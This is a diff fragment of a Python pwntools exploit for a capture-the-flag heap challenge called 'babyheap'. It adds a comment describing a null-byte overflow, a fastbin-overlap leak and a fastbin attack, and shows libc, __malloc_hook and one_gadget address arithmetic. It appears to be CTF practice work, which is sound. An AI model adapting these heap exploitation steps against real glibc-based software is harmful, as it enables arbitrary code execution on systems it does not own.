@@ -1,5 +1,8 @@
 #! /usr/bin/python
 
+# null-byte overflow in alloc function => mergin 2 small chunks and overlapping fastbin chunk between them => leak
+# fastbin attack
+
 from pwn import *
 
 s = process("./babyheap")
@@ -87,7 +90,6 @@ __malloc_hook_addr = libc_addr + __malloc_hook_offset
 one_gadget_offset = 0x4526a
 one_gadget_addr = libc_addr + one_gadget_offset
 hook = __malloc_hook_addr - 0x23 # 3C4AED
-log.info('libc_addr = ' + hex(libc_addr))
 log.info('__malloc_hook_addr = ' + hex(__malloc_hook_addr))
 log.info('one_gadget_addr = ' + hex(one_gadget_addr))
 
